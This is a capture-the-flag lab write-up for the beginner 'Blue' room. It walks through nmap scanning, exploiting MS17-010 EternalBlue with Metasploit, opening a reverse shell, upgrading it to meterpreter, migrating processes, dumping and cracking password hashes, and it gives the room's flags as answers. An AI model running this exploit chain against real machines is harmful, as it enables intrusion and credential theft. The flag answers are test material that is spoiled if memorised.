# Blue
 This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused. 


## TASK 1 RECON

### QUESTION 1 TASK 1
> Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

<pre>

NO ANSWER 
 
</pre>

### QUESTION 2 TASK 1
> How many ports are open with a port number under 1000?
<h3> ANSWER : 3 </h3>
<pre>


┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sS 10.49.183.123
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 20:42 EST
Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.17% done; ETC: 20:42 (0:00:00 remaining)
Stats: 0:02:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 20:44 (0:00:00 remaining)
Nmap scan report for 10.49.183.123
Host is up (0.100s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 174.15 seconds
 
 
</pre>

### QUESTION 3 TASK 1
> What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
<h3> ANSWER : ms17-010 </h3>
<pre>

┌──(kali㉿kali)-[~]
└─$ nmap --script smb-vuln* 10.49.183.123
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-27 21:02 EST
Nmap scan report for 10.49.183.123
Host is up (0.099s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 9.20 seconds

 
</pre>



## TASK 2 GAIN ACCESS

### QUESTION 1 TASK 2
> Start Metasploit

<pre>

NO ANSWER 
 
</pre>


### QUESTION 2 TASK 2
> Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
<h3> ANSWER : exploit/windows/smb/ms17_010_eternalblue </h3>

<pre>

msf auxiliary(scanner/smb/smb_version) > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption                                 
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution       
  ...


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                  
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'                                                                                    

msf auxiliary(scanner/smb/smb_version) > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue)

 
</pre>


### QUESTION 3 TASK 2
> Show options and set the one required value. What is the name of this value? (All caps for submission)
<h3> ANSWER : RHOSTS </h3>
<pre>

msf exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.49.183.123    yes       The target host(s), see https://docs.metaspl
                                             oit.com/docs/using-metasploit/basics/using-m
                                             etasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for aut
                                             hentication. Only affects Windows Server 200
                                             8 R2, Windows 7, Windows Embedded Standard 7
                                              target machines.
   SMBPass                         no        (Optional) The password for the specified us
                                             ername
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit
                                              Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. O
                                             nly affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machin
                                             es.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proces
                                        s, none)
   LHOST     10.10.1.128      yes       The listen address (an interface may be specified
                                        )
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > 
 
</pre>


### QUESTION 4 TASK 2
> Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:
> `set payload windows/x64/shell/reverse_tcp`
> With that done, run the exploit!
<H3> ANSWER : NO ANSWER </H3>
<pre>

msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.49.183.123    yes       The target host(s), see https://docs.metaspl
                                             oit.com/docs/using-metasploit/basics/using-m
                                             etasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for aut
                                             hentication. Only affects Windows Server 200
                                             8 R2, Windows 7, Windows Embedded Standard 7
                                              target machines.
   SMBPass                         no        (Optional) The password for the specified us
                                             ername
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit
                                              Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. O
                                             nly affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machin
                                             es.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, proces
                                        s, none)
   LHOST     10.10.1.128      yes       The listen address (an interface may be specified
                                        )
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > 
 
 
</pre>



### QUESTION 5 TASK 2
> With that done, run the exploit!

<pre>

ANSWER : NO ANSWER 
 
</pre>



### QUESTION 6 TASK 2
> Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

<pre>

ANSWER : NO ANSWER 
 
</pre>


 ## TASK 3 ESCALATE

### QUESTION 1 TASK 3
>If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
<h1> ANSWER : post/multi/manage/shell_to_meterpreter </h1>
 
<pre>

msf exploit(windows/smb/ms17_010_eternalblue) > search shell_to

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter                                                                      

msf exploit(windows/smb/ms17_010_eternalblue) >
 
</pre>


### QUESTION 2 TASK 3
> Select this (use MODULE_PATH). Show options, what option are we required to change?
<h1> ANSWER : SESSION  </h1>

<pre>

msf6 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type               Information                  Connection
  --  ----  ----               -----------                  ----------
  1         shell x64/windows  Shell Banner: Microsoft Win  10.49.106.131:4444 -> 10.49
                               dows [Version 6.1.7601] ---  .167.148:49187 (10.49.167.1
                               --             
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/shell_to_meterpreter) >
 
</pre>


### QUESTION 3 TASK 3
> Set the required option, you may need to list all of the sessions to find your target here.

<pre>

ANSWER : NO ANSWER 
 
</pre>

### QUESTION 4 TASK 3
> Run! If this doesn't work, try completing the exploit from the previous task once more.

<pre>

ANSWER : NO ANSWER 
 
</pre>

### QUESTION 5 TASK 3
> Once the meterpreter shell conversion completes, select that session for use.
<pre>

ANSWER : NO ANSWER 
 
</pre>

### QUESTION 6 TASK 3
> Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter
> session for usage again. 
<pre>

ANSWER : NO ANSWER 
 
</pre>

### QUESTION 7 TASK 3
> List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
<h3> ANSWER : NO ANSWER </h3>
<pre>

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 100   664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 356   768   powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 484   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 584   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 616   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 712   616   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 720   616   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 728   616   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 784   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 840   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 908   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 956   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1124  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1176  712   VSSVC.exe             x64   0        NT AUTHORITY\SYSTEM
 1228  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1332  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1368  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1468  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1524  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1584  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1588  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1664  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1984  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2056  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2064  1664  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
 2096  840   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 2116  840   WmiPrvSE.exe
 2444  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2576  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2584  1332  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2608  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2712  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2784  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2948  712   rundll32.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\rundll32.exe


 
</pre>

### QUESTION 8 TASK 3
> Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion 
> process or reboot the machine and start once again. If this happens, try a different process next time. 
<h3> ANSWER : NO ANSWER </h3>
<pre>

meterpreter > migrate 1332
[*] Migrating from 356 to 1332...
[*] Migration completed successfully.
meterpreter >
 
</pre>

## TASK 4 CRACKING

### QUESTION 1 TASK 4
> Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
<h3> ANSWER : Jon </h3>


<pre>

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 
</pre>


### QUESTION 2 TASK 4
> Copy this password hash to a file and research how to crack it. What is the cracked password?
<h3> ANSWER : alqfna22 </h3>

> [!note]
> https://crackstation.net/

<pre>

<img width="1002" height="276" alt="image" src="https://github.com/user-attachments/assets/92bb06ae-74bf-4bab-b618-db4231139c41" />

 
</pre>


## TASK 5 FIND FLAGS !

### QUESTION 1 TASK 5
> Flag1? This flag can be found at the system root.
<h3> ANSWER : flag{access_the_machine} </h3>

<pre>

meterpreter > search -f flag1.txt
Found 1 result...
=================

Path          Size (bytes)  Modified (UTC)
----          ------------  --------------
c:\flag1.txt  24            2019-03-17 19:27:21 +0000

meterpreter >
 
</pre>

### QUESTION 2 TASK 5
> Flag2? This flag can be found at the location where passwords are stored within Windows.
<h3> flag{sam_database_elevated_access} </h3>

<pre>

meterpreter > search -f flag2.txt
Found 1 result...
=================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Windows\System32\config\flag2.txt  34            2019-03-17 19:32:48 +0000


 
</pre>

### QUESTION 3 TASK 5
> flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
<h3>  flag{admin_documents_can_be_valuable} </h3>

<pre>

meterpreter > search -f flag3.txt
Found 1 result...
=================

Path                              Size (bytes)  Modified (UTC)
----                              ------------  --------------
c:\Users\Jon\Documents\flag3.txt  37            2019-03-17 19:26:36 +0000


 
</pre>
